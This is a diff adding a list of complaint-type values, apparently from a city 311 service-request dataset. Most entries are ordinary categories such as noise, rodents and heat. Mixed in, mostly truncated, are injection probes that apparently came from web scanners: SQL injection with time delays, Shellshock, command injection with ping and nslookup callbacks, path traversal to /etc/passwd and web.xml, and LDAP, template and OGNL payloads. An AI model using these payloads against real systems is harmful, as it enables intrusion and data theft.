@@ -1,0 +1,494 @@
+OEM Disabled Vehicle
+DOR Literature Request
+Fire Alarm - New System
+&lt;vlv xmlns=&quot;http://...
+Misc. Comments'||(select ex...
+COVID-19 Non-essential Construction
+Oil or Gas Spill
+Water Leak
+Derelict Vehicle
+Misc. Comments');declare @q...
+Street Sweeping Complaint
+Forensic Engineering
+Noise - House of Worship
+Electronics Waste
+Single Occupancy Bathroom
+DOF Property - Owner Issue
+SG-99
+Poison Ivy
+Appliance
+Animal Abuse
+Misc. Comments,(select*from...
+DEP Highway Condition
+Seasonal Collection
+Plant
+Home Care Provider Complaint
+DEP Bridge Condition
+DHS Income Savings Requirement
+.../....///.../....///.../....
+Noise - Helicopter
+Misc. Comments&amp;nslookup...
+PLUMBING
+Vacant Lot
+Indoor Sewage
+Rangehood
+General Question
+%c0%ae/%c0%ae/%c0%ae/WEB-IN...
+Special Enforcement
+Dispatched Taxi Compliment
+Drinking
+%{(#dm=@ognl.OgnlContext@DE...
+Public Assembly
+Building Condition
+Stalled Sites
+MSOTHER
+Missed Collection (All Materials)
+Abandoned Bike
+Street Sign - Damaged
+Advocate-Prop Class Incorrect
+Non-Residential Heat
+Case Management Agency Complaint
+c:\windows\win.ini Misc. Co...
+DOF Property - State Rebate
+Bereavement Support Group
+DOF Parking - Request Copy
+Misc. Comments&quot;|echo 2...
+Misc. Comments'.sleep(20).'
+Cooling Tower
+APPLIANCE
+Unsanitary Condition
+SRDE
+Alzheimer's Care
+Outside Building
+Tunnel Condition
+Unsanitary Animal Facility
+Water Maintenance
+Found Property
+ZTESTINT
+Request Large Bulky Item Collection
+Vaccine Mandate Non-Compliance
+Graffiti
+Construction
+Sweeping/Missed-Inadequate
+Electrical
+Misc. Comments' and 7702=77...
+266dyrgvhg1egsyp2oq57axbm2s...
+SCRIE
+Street Sign - Dangling
+Violation of Park Rules
+Legal Services Provider Complaint
+../../../WEB-INF/web.xml
+Outdoor Dining
+Green Taxi Report
+Weatherization
+Fire Alarm - Modification
+Advocate-Co-opCondo Abatement
+bcd9&lt;!--esi--&gt;1ggp&lt...
+Ferry Inquiry
+Fire Alarm - Replacement
+Advocate-Commercial Exemptions
+Illegal Tree Damage
+Smoking
+STRUCTURAL
+DCA / DOH New License Application Request
+Transportation Provider Complaint
+Panhandling
+FATF
+Retailer Complaint
+Urinating in Public
+Illegal Posting
+Gas Station Discharge Lines
+Storm
+Food Establishment
+AGENCY
+Industrial Waste
+DOF Parking - Tax Exemption
+Root/Sewer/Sidewalk Condition
+Dumpster Complaint
+Bridge Condition
+Homebound Evacuation 4
+Misc. Comments',0)waitfor d...
+Building Marshal's Office
+Misc. Comments69075347' or ...
+Mass Gathering Complaint
+Scaffold Safety
+...\./...\./...\./...\./......
+GENERAL CONSTRUCTION
+Executive Inspections
+{!xmlparser v='&lt;!DOCTYPE...
+Derelict Vehicles
+Advocate-Business Tax
+Institution Disposal Complaint
+Overflowing Recycling Baskets
+Forms
+Sweeping/Missed
+Boilers
+Sanitation Worker or Vehicle Complaint
+Public Toilet
+Construction Lead Dust
+Illegal Animal Sold
+UNSANITARY CONDITION
+./validate_form.php
+Comments
+Misc. Comments'&quot;`0&amp...
+Parent Leadership
+Tanning
+DEP Sidewalk Condition
+Water System
+Unlicensed Dog
+() { :;}; /bin/sleep 11
+../../../WEB-INF/web.xml;x=
+DOF Property - City Rebate
+Misc. Comments' and (select...
+yw97y0gi2s
+Ferry Permit
+Summer Camp
+City Vehicle Placard Complaint
+../WEB-INF/web.xml
+Misc. Comments  BCC:a5glxzf...
+Trapping Pigeon
+NonCompliance with Phased Reopening
+GENERAL
+$(sleep 11)
+Lost Property
+Standing Water
+Vending
+X-Ray Machine/Equipment
+kawn''lcgv
+General Construction/Plumbing
+Illegal Fireworks
+Advocate-Property Value
+&lt;odb xmlns:xi=&quot;http...
+Investigations and Discipline (IAD)
+ATF
+Misc. Comments'+(select*fro...
+Misc. Comments..\..\..\..\....
+*)(objectClass=*
+Blocked Driveway
+DHS Advantage -Landlord/Broker
+Traffic Signal Condition
+Misc. Comments);declare @q ...
+Dead Animal
+E-Scooter
+Emergency Response Team (ERT)
+c:\windows\win.ini
+Misc. Comments'+(function()...
+Advocate - RPIE
+Research Questions
+Misc. Comments47876391' or ...
+Meals Home Delivery Required
+Misc. Comments'+sleep(20.to...
+School Maintenance
+Sprinkler - Mechanical
+Tattooing
+Misc. Comments' and '1618'=...
+DHS Advantage - Third Party
+OUTSIDE BUILDING
+() { _; } &gt;_
+AHV Inspection Unit
+Employee Behavior
+../WEB-INF/web.xml;x=
+DOF Property - Property Value
+DPR Internal
+Mold
+Street Sign - Missing
+Highway Sign - Damaged
+Dead/Dying Tree
+Asbestos/Garbage Nuisance
+Misc. Comments';declare @q ...
+Registration and Transfers
+@(9313*3464)
+file:///c:/windows/win.ini
+Private School Vaccine Mandate Non-Compliance
+Traffic/Illegal Parking
+Senior Center Complaint
+Misc. Comments}}t2v95'/&quo...
+Dirty Conditions
+Peeling Paint
+.../...//.../...//.../...//...
+Private or Charter School Reopening
+DOF Parking - Payment Issue
+Building Drinking Water Tank
+Interior Demo
+Electric
+New Tree Request
+%2e%2e%5c%2e%2e%5c%2e%2e%5c...
+file:///etc/passwd
+Water Drainage
+Illegal Dumping
+%c0%ae/%c0%ae/%c0%ae/%c0%ae...
+Squeegee
+Misc. Comments52038737' or ...
+Face Covering Violation
+Sewer
+Drug Activity
+Dead Tree
+Fire Alarm - Reinspection
+Taxi Compliment
+Indoor Air Quality
+Facade Insp Safety Pgm
+Beach/Pool/Sauna Complaint
+ELECTRIC
+SAFETY
+DSNY Spillage
+Calorie Labeling
+PAINT - PLASTER
+Asbestos
+HEAT/HOT WATER
+DOF Property - Update Account
+For Hire Vehicle Complaint
+%2fetc%2fpasswd
+Noise - Commercial
+DOF Parking - DMV Clearance
+Housing - Low Income Senior
+Transfer Station Complaint
+Misc. Comments' and '7835'=...
+Unsanitary Pigeon Condition
+Recycling Basket Complaint
+ELEVATOR
+Noise - Street/Sidewalk
+DEP Street Condition
+Request Changes - A.S.P.
+Obstruction
+Hazardous Material
+Green Taxi Complaint
+../../../../WEB-INF/web.xml
+Misc. Comments&quot;|ping -...
+Radioactive Material
+LEAD
+Bottled Water
+Home Delivered Meal - Missed Delivery
+Misc. Comments')waitfor del...
+Misc. Comments|echo 3p7wexz...
+DOOR/WINDOW
+Advocate - Lien
+Misc. Comments'|echo y9v6fc...
+Misc. Comments88909845' or ...
+Door/Window
+No Child Left Behind
+Hazardous Materials
+Snow or Ice
+SNW
+Recycling Enforcement
+Drinking Water
+Discipline and Suspension
+Misc. Comments'(select*from...
+Utility Program
+Uprooted Stump
+`sleep 11`
+Question
+Sustainability Enforcement
+Taxi Report
+Sweeping/Inadequate
+%{4761*8506}
+Window Guard
+Borough Office
+Taxi Licensee Complaint
+a'a\'b&quot;c&gt;?&gt;%}}%%...
+Misc. Comments' and 6049=60...
+Portable Toilet
+Water Conservation
+hcvn1{{687*375}}gji51
+Residential Disposal Complaint
+Sidewalk Condition
+Animal in a Park
+Literature Request
+Non-Emergency Police Matter
+Select Message Type...
+Open Flame Permit
+Misc. Comments&amp;ping -n ...
+Overflowing Litter Baskets
+Quality of Life
+Advocate - Levy
+Disorderly Youth
+NORC Complaint
+Misc. Comments&amp;echo xjd...
+FCST
+Building Marshals office
+Commercial Disposal Complaint
+Illegal Animal - Sold/Kept
+CONSTRUCTION
+Consumer Complaint
+Municipal Parking Facility
+/./validate_form.php
+Vendor Enforcement
+qfix4${695*589}lixaf
+Misc. Comments'
+Misc. Comments]]&gt;&gt;&lt;
+Safety
+() { :;}; /bin/sleep 0
+Building/Use
+Lot Condition
+Home Repair
+Miscellaneous Categories
+Trans Fat
+...\.\...\.\...\.\...\.\......
+Homeless Person Assistance
+${3804*3137}
+Noise - Residential
+Rodent
+(select extractvalue(xmltyp...
+Home Delivered Meal Complaint
+For Hire Vehicle Report
+Advocate - Other
+../../WEB-INF/web.xml
+HEAP Assistance
+Misc. Comments'|ping -c 21 ...
+Request Xmas Tree Collection
+Incorrect Data
+Abandoned Vehicle
+Lead
+DOF Property - RPIE Issue
+Harboring Bees/Wasps
+Misc. Comments&quot;
+Public Payphone Complaint
+Special Projects Inspection Team (SPIT)
+Street Light Condition
+Noise - Vehicle
+Dirty Condition
+(select load_file('\\\\615h...
+.../Misc. Comments
+../../../../../../../../../...
+Elevator
+Advocate-SCRIE/DRIE
+Curb Condition
+Unleashed Dog
+Bus Stop Shelter Complaint
+SRGOVG
+FLOORING/STAIRS
+Broken Parking Meter
+Animal Facility - No Permit
+Boiler
+Pet Shop
+..././..././..././..././......
+Taxpayer Advocate Inquiry
+WATER LEAK
+BEST/Site Safety
+Misc. Comments%}dt2pq'/&quo...
+DOF Property - Reduction Issue
+Broken Muni Meter
+g0oii1s4s5)(objectClass=*
+%c0%ae/WEB-INF/web.xml
+Litter Basket / Request
+Noise Survey
+Housing Options
+Mobile Food Vendor
+Advocate-UBT
+Standpipe - Mechanical
+Collection Truck Noise
+Bike/Roller/Skate Chronic
+Maintenance or Facility
+HPD Literature Request
+Snow
+Special Natural Area District (SNAD)
+DOF Property - Payment Issue
+Mosquitoes
+Hazmat Storage/Use
+Cranes and Derricks
+Litter Basket Request
+DOF Parking - Request Status
+Change Collection Schedule
+Internal Code
+Water Quality
+Animal-Abuse
+DRIE
+DHS Advantage - Tenant
+Teaching/Learning/Instruction
+Wood Pile Remaining
+Day Care
+%2e%2e%2f%2e%2e%2f%2e%2e%2f...
+Injured Wildlife
+Advocate-Personal Exemptions
+1430*4963
+Missed Collection
+Noise - Park
+Flooring/Stairs
+Noise
+eval(compile('for x in rang...
+Encampment
+Electronics Waste Appointment
+Construction Safety Enforcement
+%c0%ae/%c0%ae/WEB-INF/web.xml
+../../WEB-INF/web.xml;x=
+Derelict Bicycle
+OEM Literature Request
+NONCONST
+Homeless Encampment
+Misc. Comments'+(select loa...
+Food Poisoning
+Misc. Comments{${sleep(20)}}
+Paint/Plaster
+Health
+Facades
+.../.\.../.\.../.\.../.\......
+Heat/Hot Water
+Bus Stop Shelter Placement
+Illegal Parking
+DSNY Internal
+Unsanitary Animal Pvt Property
+http://g7orz5h9iu2sh6z332rj...
+General
+/etc/passwd
+HEATING
+..\..\..\..\..\..\..\..\..\...
+Special Operations
+PAINT/PLASTER
+Dept of Investigations
+Taxi Complaint
+*)(!(objectClass=*)
+Public Assembly - Temporary
+%E5%98%8A%E5%98%8DX-Injecti...
+Highway Sign - Dangling
+Damaged Tree
+\windows\win.ini
+Elder Abuse
+Highway Condition
+MOLD
+Misc. Commentso0w3r%&gt;xb6...
+Unstable Building
+Snow Removal
+Bike Rack Condition
+Misc. Comments&gt;  BCC:bl0...
+Foam Ban Enforcement
+Dispatched Taxi Complaint
+Parking Card
+Advocate-Foreclosure
+Lifeguard
+Litter Basket Complaint
+ZSYSTEST
+DOB Posted Notice or Order
+Sewer Maintenance
+Ferry Complaint
+Misc. Comments|ping -c 21 1...
+Misc. Comments;declare @q v...
+Other Enforcement
+Real Time Enforcement
+Posting Advertisement
+VACANT APARTMENT
+DOF Property - Request Copy
+Sanitation Condition
+Misc. Comments|nslookup -q=...
+Air Quality
+Misc. Comments'+eval(compil...
+Street Condition
+Highway Sign - Missing
+Benefit Card Replacement
+DOF Parking - Address Update
+Misc. Comments' waitfor del...
+Misc. Comments../../../../....
+DOF Literature Request
+LinkNYC
+Adopt-A-Basket
+Homeless Street Condition
+Plumbing
+Advocate-Prop Refunds/Credits
+nslookup -q=cname nneyfcxgy...
+Traffic
+Misc. Comments|ping -n 21 1...
+Eviction
+&quot;--&gt;'--&gt;`--&gt;&...
+Illegal Animal Kept as Pet
+Overgrown Tree/Branches
+idexf3mrb7)(!(objectClass=*)
+FHV Licensee Complaint
+Misc. Commentseowljujfh8
